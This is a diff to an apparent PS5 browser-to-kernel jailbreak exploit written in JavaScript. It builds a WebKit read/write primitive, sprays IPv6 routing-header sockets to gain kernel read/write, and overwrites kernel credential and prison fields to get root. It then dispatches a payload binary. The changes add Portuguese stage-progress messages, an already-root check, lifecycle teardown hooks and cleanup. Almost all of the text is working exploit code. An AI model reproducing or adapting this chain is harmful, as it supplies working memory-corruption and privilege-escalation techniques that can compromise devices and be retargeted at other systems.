@@ -22,7 +22,9 @@ function post(tag, detail) {
         "&detail=" +
         encodeURIComponent(String(detail == null ? "" : detail)),
     );
-  } catch (e) {}
+  } catch (error_) {
+    /* telemetry is best-effort */
+  }
 }
 
 const VERBOSE = params.get("verbose") === "1";
@@ -30,10 +32,10 @@ const PROSE = [
   / -- /,
   /\.\s/,
   /;\s/,
-  /,\s+(which|so|and that|because|since|as that)\s/,
-  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
-  /\s+so\s+[a-z]/,
-  /\s+\([a-z][^)]{40,}\)/,
+  /,\s(which|so|and that|because|since|as that)\s/,
+  /\s(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
+  /\sso\s[a-z]/,
+  /\s\([a-z][^)]{40,}\)/,
 ];
 function terse(s) {
   if (VERBOSE || s == null) return s;
@@ -42,7 +44,7 @@ function terse(s) {
     const m = re.exec(s);
     if (m && m.index > 0) s = s.slice(0, m.index);
   }
-  s = s.replace(/\s+$/, "");
+  s = s.trimEnd();
   if (s.length > 140) s = s.slice(0, 140) + "...";
   return s;
 }
@@ -83,6 +85,20 @@ function mark(tag, detail) {
 function trace(tag, detail) {
   if (VERBOSE) mark(tag, detail);
   else post(tag, detail);
+}
+let currentStage = 1;
+function setStageUI(step, title, sub, c) {
+  currentStage = step;
+  if (typeof window !== "undefined" && window.setStage) {
+    window.setStage(step, title, sub, c);
+  } else {
+    state(title + (sub ? " - " + sub : ""), c);
+  }
+}
+function updateSub(sub) {
+  if (typeof window !== "undefined" && window.updateSubstate) {
+    window.updateSubstate(sub);
+  }
 }
 function state(t, c) {
   if (!SHOW_LOG || !stateEl) return;
@@ -292,17 +308,21 @@ let allDone = false,
         "read-phase retry " + retryCount() + "/" + RETRY_MAX,
       );
 
-    state("running the primitive...", "warn");
+    setStageUI(1, "ETAPA 1/4: WebKit Exploit", "Estabilizando layout de heap e estabelecendo primitiva ARW...");
     await new Promise((r) => setTimeout(r, 0));
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
     const carrier = await establishPrimitive({
       maxAttempts: 6,
-      onEvent: (t, d, a) =>
+      onEvent: (t, d, a) => {
+        if (a != null) {
+          updateSub("Tentativa " + a + "/6: Ajustando memória e ArrayBuffers (" + t + ")...");
+        }
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
           (a != null ? "[" + a + "] " : "") + (d || ""),
-        ),
+        );
+      },
     });
     installWindowP(carrier, { promote: false });
     if (!window.p) throw new Error("window.p was not installed");
@@ -316,6 +336,7 @@ let allDone = false,
         "   (promotion off: the 137 MB stays pinned)",
     );
     mark("PRIMITIVE-OK", "");
+    setStageUI(1, "ETAPA 1/4: WebKit Primitives Prontas", "Primitivas de leitura/escrita ARW estabelecidas com sucesso.", "ok");
 
     const cell = p.leakval(Math.expm1);
     const nativeFn = p.read8(
@@ -537,13 +558,26 @@ let allDone = false,
       "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
     );
 
+    // Prevenção de Kernel Panic: se o console já estiver desbloqueado (root ativo),
+    // aborta a cadeia do kernel imediatamente para não causar concorrência destrutiva.
+    try {
+      const uid0 = sc(SYS.getuid).i32;
+      const su0 = sc(SYS.setuid, 0).i32;
+      if (uid0 === 0 || su0 === 0) {
+        mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
+        state("ALREADY JAILBROKEN -- nothing to do", "ok");
+        setStageUI(4, "CONSOLE JÁ DESBLOQUEADO (ROOT ATIVO)", "O console já possui privilégios de root. Nenhuma ação necessária.", "ok");
+        finishUI(true);
+        return;
+      }
+    } catch (error_) {
+      /* pre-check is best-effort before full kernel initialization */
+    }
+
     const scratchAb = new ArrayBuffer(0x1000);
     keepAlive.push(scratchAb);
-    const scratch = bufAddr(scratchAb);
     const argAb = new ArrayBuffer(8);
     keepAlive.push(argAb);
-    const argAddr = bufAddr(argAb),
-      argDv = new DataView(argAb);
     const lenAb = new ArrayBuffer(8);
     keepAlive.push(lenAb);
     const lenAddr = bufAddr(lenAb),
@@ -594,8 +628,7 @@ let allDone = false,
     const RTH_SIZE = 0x48,
       RTH_LEN = 8,
       RTH_SEGLEFT = 4;
-    const NODE0_DEC = 0x04000800,
-      SCRATCH_PAGE = 0x04000000;
+    const SCRATCH_PAGE = 0x04000000;
     const SYS_MMAP = 477;
     const PROT_RW = 3,
       MAP_PRIVATE = 2,
@@ -608,6 +641,7 @@ let allDone = false,
       ? parseInt(params.get("spin"), 10)
       : 40000000;
     mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
+    setStageUI(2, "ETAPA 2/4: Thread & Sockets", "Inicializando workers, vazando curthread e disparando spray de sockets IPv6...");
 
     async function bringWorker(name) {
       const w = { name: name, armed: false, wired: false };
@@ -1195,8 +1229,7 @@ let allDone = false,
     const STEP_OFF = 2,
       STEP_MAG = 0x10000,
       PAIR = STEP_MAG + 1;
-    const TD_UCRED_OFF = 0x130,
-      CR_RUID_OFF = 0x08;
+    const TD_UCRED_OFF = 0x130;
     const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
     const KB = PAIR;
 
@@ -1350,6 +1383,7 @@ let allDone = false,
     }
 
     const X1 = CT1.add32(TD_UCRED_OFF);
+    let kA = 0;
     mark(
       "PR-PASSA-TARGET",
       "X1 = w1.curthread+0x130 (td_ucred) = " +
@@ -1408,7 +1442,7 @@ let allDone = false,
         check("POINTER-READ", false, "pass A found no crossing");
         return;
       }
-      var kA = KA - mA + 1;
+      kA = KA - mA + 1;
       mark(
         "PR-PASSA",
         "m=" +
@@ -1849,6 +1883,8 @@ let allDone = false,
       return;
     }
 
+    setStageUI(3, "ETAPA 3/4: Kernel R/W", "Kernel Base localizado em 0x" + KBASE + ". Armas sysctl 64-bit configuradas.");
+
     const OID = KBASE.add32(off.k_oid_kern_file);
     const O_NUM = OID.add32(0x10);
     const O_VIS = OID.add32(0x50);
@@ -1859,39 +1895,6 @@ let allDone = false,
       "KF-TARGETS",
       "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN,
     );
-
-    function oracleAt(addr, n, label) {
-      const sAb = new ArrayBuffer(4);
-      keepAlive.push(sAb);
-      const sDv = new DataView(sAb),
-        sAd = bufAddr(sAb);
-      sDv.setInt32(0, 0x40000000, true);
-      let i = 0;
-      for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
-      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
-      if (runChain(i, label) === null) return null;
-      const m = 0x40000000 - sDv.getInt32(0, true);
-      return { m: m, v: m > 0 ? n - m + 1 : 0 };
-    }
-
-    function sweepAt(stepAd, probeAd, low, label) {
-      const sAb = new ArrayBuffer(4 * SWEEP);
-      keepAlive.push(sAb);
-      const sDv = new DataView(sAb),
-        sAd = bufAddr(sAb);
-      for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 0x40000000, true);
-      let i = 0;
-      for (let k = 0; k < SWEEP; k++) {
-        wnode(i++, stepAd, DUM, false);
-        wnode(i++, probeAd, sAd.add32(k * 4), false);
-      }
-      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
-      if (runChain(i, label) === null) return null;
-      let obs = "";
-      for (let k = 0; k < SWEEP; k++)
-        obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
-      return decodeByte(obs, low);
-    }
 
     function planSub(cur, delta) {
       const d = [
@@ -2515,6 +2518,7 @@ let allDone = false,
           ) {
             allDone = true;
           } else {
+            setStageUI(4, "ETAPA 4/4: Jailbreak & Payload", "Elevando privilégios root, armando Anti-WLOD Shield e despachando payload...");
             const sameI64 = (a, b) =>
               a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
             const kptr = (v) => !!v && v.hi >>> 0 >= 0xffff0000;
@@ -2727,19 +2731,25 @@ let allDone = false,
                     " fdescfree/crfree balanced at process exit)",
                 );
 
-                jbRestoreHook = function (why) {
+                jbRestoreHook = function (why, restoreCreds) {
                   if (jbRestored) return true;
 
+                  // Refcounted VFS and Prison handles (ALWAYS balance to prevent fdescfree/crfree WLOD)
                   F.setBInt(FD_RDIR, jbSaved.rdir);
                   F.setBInt(FD_JDIR, jbSaved.jdir);
                   U.setBInt(CR_PRISON, jbSaved.prison);
-                  U.setBInt(CR_SCECAPS1, jbSaved.caps1);
-                  U.setBInt(CR_SCECAPS0, jbSaved.caps0);
-                  U.setInt32(CR_UID, jbSaved.uid);
-                  U.setInt32(CR_RUID, jbSaved.ruid);
-                  U.setInt32(CR_SVUID, jbSaved.svuid);
-                  U.setInt32(CR_NGROUPS, jbSaved.ngroups);
-                  U.setInt32(CR_RGID, jbSaved.rgid);
+
+                  // Optional: restore UID/caps on process teardown if explicitly requested
+                  if (restoreCreds) {
+                    U.setBInt(CR_SCECAPS1, jbSaved.caps1);
+                    U.setBInt(CR_SCECAPS0, jbSaved.caps0);
+                    U.setInt32(CR_UID, jbSaved.uid);
+                    U.setInt32(CR_RUID, jbSaved.ruid);
+                    U.setInt32(CR_SVUID, jbSaved.svuid);
+                    U.setInt32(CR_NGROUPS, jbSaved.ngroups);
+                    U.setInt32(CR_RGID, jbSaved.rgid);
+                  }
+
                   const okRdir = sameI64(F.getBInt(FD_RDIR), jbSaved.rdir);
                   const okJdir = sameI64(F.getBInt(FD_JDIR), jbSaved.jdir);
                   const okPr = sameI64(U.getBInt(CR_PRISON), jbSaved.prison);
@@ -3103,6 +3113,9 @@ let allDone = false,
                     plDone,
                     "rc=" + rc + " handle=" + handle,
                   );
+                  if (plDone) {
+                    setStageUI(4, "🎉 JAILBREAK CONCLUÍDO — PAYLOAD ATIVO", "Privilégios root concedidos, Anti-WLOD Shield ativo e payload2.bin em execução.", "ok");
+                  }
                 }
               }
             }
@@ -3132,23 +3145,43 @@ let allDone = false,
                 "w1.td_ucred must equal the real ucred before this thread is" +
                   " torn down at process exit (crfree runs on it)",
               );
-            } catch (e6) {
-              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
+            } catch (error_) {
+              mark("JB-TDUCRED-THREW", (error_ && error_.message) || String(error_));
             }
 
-            if (jbRestoreHook && !KEEP_JB) jbRestoreHook("end-of-run");
-            else if (jbRestoreHook) {
+            try {
+              if (w1 && w1.worker) {
+                w1.worker.postMessage({ id: -2, name: "stopSpin", args: [] });
+                mark("PR-UNPARK", "w1 stopSpin posted -- worker loop disarmed");
+              }
+            } catch (error_) {
+              mark("PR-UNPARK-THREW", (error_ && error_.message) || String(error_));
+            }
+
+            // Register complete lifecycle hooks (Orbis WebKit: visibilitychange fires on PS button)
+            const safeTeardown = function (ev) {
+              try {
+                if (jbRestoreHook) jbRestoreHook(ev || "lifecycle-event", true);
+              } catch (e) {}
+            };
+            window.addEventListener("pagehide", function () { safeTeardown("pagehide"); });
+            window.addEventListener("beforeunload", function () { safeTeardown("beforeunload"); });
+            window.addEventListener("unload", function () { safeTeardown("unload"); });
+            document.addEventListener("visibilitychange", function () {
+              if (document.visibilityState === "hidden") {
+                safeTeardown("visibility-hidden");
+              }
+            });
+
+            if (jbRestoreHook && !KEEP_JB) {
+              // PS5 stabilization window: allow 600ms for payload resident thread initialization
+              await new Promise((r) => setTimeout(r, 600));
+              jbRestoreHook("end-of-run", false);
+            } else if (jbRestoreHook) {
               mark(
                 "JB-KEEP",
-                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
-                  " be restored on pagehide; if the browser is killed instead," +
-                  " REBOOT rather than closing it.",
+                "?keepjb=1 -- handles balanced on lifecycle events (visibilitychange/pagehide/beforeunload)",
               );
-              window.addEventListener("pagehide", function () {
-                try {
-                  jbRestoreHook("pagehide");
-                } catch (e) {}
-              });
             }
 
             mark(
@@ -3170,6 +3203,26 @@ let allDone = false,
                 "  (.data/.text/caps need a reboot; the refcounted handles do not)",
             );
             allDone = true;
+
+            // Neutralize POOL routing headers and exit cleanly without redundant multiFire
+            setNode0(0, N0SINK);
+            let renew = 0;
+            for (const fd of POOL)
+              if (
+                sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0
+              )
+                renew++;
+            mark(
+              "PR-NEUTRALISE",
+              "next=0 on " +
+                renew +
+                "/" +
+                POOL.length +
+                "  armings=" +
+                armCount +
+                "  (clean exit: redundant multiFire suppressed)",
+            );
+            return;
           }
         }
       }
@@ -3319,25 +3372,30 @@ let allDone = false,
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
     state("threw", "bad");
+    setStageUI(currentStage || 1, "FALHA NA EXECUÇÃO DO EXPLOIT", (e && e.message) || String(e), "bad");
   } finally {
     try {
-      if (jbRestoreHook) jbRestoreHook("finally");
-    } catch (e5) {
-      mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
+      if (jbRestoreHook) jbRestoreHook("finally", false);
+    } catch (error_) {
+      mark("JB-RESTORE-THREW", (error_ && error_.message) || String(error_));
     }
     try {
-      if (opened.length && closeFd && mainArmed) {
+      if (opened.length && closeFd) {
         let n = 0;
-        for (const fd of opened) if (closeFd(fd) === 0) n++;
+        for (const fd of opened) {
+          try {
+            if (closeFd(fd) === 0) n++;
+          } catch (error_) {}
+        }
         mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
       }
-    } catch (e3) {
-      mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
+    } catch (error_) {
+      mark("CLOSE-THREW", (error_ && error_.message) || String(error_));
     }
     try {
       if (pinRestore) pinRestore();
-    } catch (e4) {
-      mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
+    } catch (error_) {
+      mark("PIN-RESTORE-THREW", (error_ && error_.message) || String(error_));
     }
     try {
       if (mainArmed && mainMf && mainOrig && p) {
@@ -3345,13 +3403,13 @@ let allDone = false,
         mainArmed = false;
         mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
       }
-    } catch (e2) {
-      mark("DISARM-THREW", (e2 && e2.message) || String(e2));
+    } catch (error_) {
+      mark("DISARM-THREW", (error_ && error_.message) || String(error_));
     }
 
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
-    } catch (e) {}
+    } catch (error_) {}
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
@@ -3362,6 +3420,6 @@ let allDone = false,
     );
     try {
       finishUI(payloadRunning);
-    } catch (eUI) {}
+    } catch (error_) {}
   }
 })();
